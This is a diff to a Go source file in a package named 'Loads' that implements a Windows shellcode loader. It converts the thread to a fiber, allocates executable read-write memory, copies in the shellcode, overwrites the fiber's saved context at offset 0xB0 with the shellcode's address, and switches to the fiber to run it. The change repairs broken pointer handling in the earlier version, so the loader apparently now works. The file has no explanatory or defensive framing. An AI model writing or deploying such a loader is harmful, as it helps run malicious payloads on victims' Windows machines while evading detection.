@@ -1,6 +1,8 @@
 package Loads
 
 import (
+	"fmt"
+	"os"
 	"syscall"
 	"unsafe"
 )
@@ -11,11 +13,10 @@ var (
 )
 
 const (
-	MEM_COMMIT                  = 0x1000
-	MEM_RESERVE                 = 0x2000
-	PAGE_EXECUTE_READWRITE      = 0x40
-	NULL                        = 0
-	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	NULL                   = 0
 )
 
 var (
@@ -28,13 +29,25 @@ var (
 	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
 )
 
-func Callback(shellcode []byte) {
-	ConvertThreadToFiber.Call(NULL)
-	var dummy func()
-	lpFiber, _, _ := CreateFiber.Call(0x100, (uintptr)(unsafe.Pointer(&dummy)), NULL)
+func dummy() {
+	var age string
+	fmt.Scanln(&age)
+}
 
+func Callback(shellcode []byte) {
+	var d func()
+	d = dummy
+	ConvertThreadToFiber.Call(NULL)
+	lpFiber, err1, _ := CreateFiber.Call(0x100, (uintptr)(unsafe.Pointer(&d)), NULL)
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	tgtFuncAddr := lpFiber + uintptr(0xB0) + addr
-	SwitchToFiber.Call(tgtFuncAddr)
+	if lpFiber == NULL {
+		fmt.Printf("GLE : %d\n", err1)
+		os.Exit(0)
+	}
+
+	tgtFuncAddr := (*uintptr)(unsafe.Pointer(lpFiber + uintptr(0xB0)))
+	*tgtFuncAddr = addr
+	fmt.Println(tgtFuncAddr)
+	SwitchToFiber.Call(lpFiber)
 }
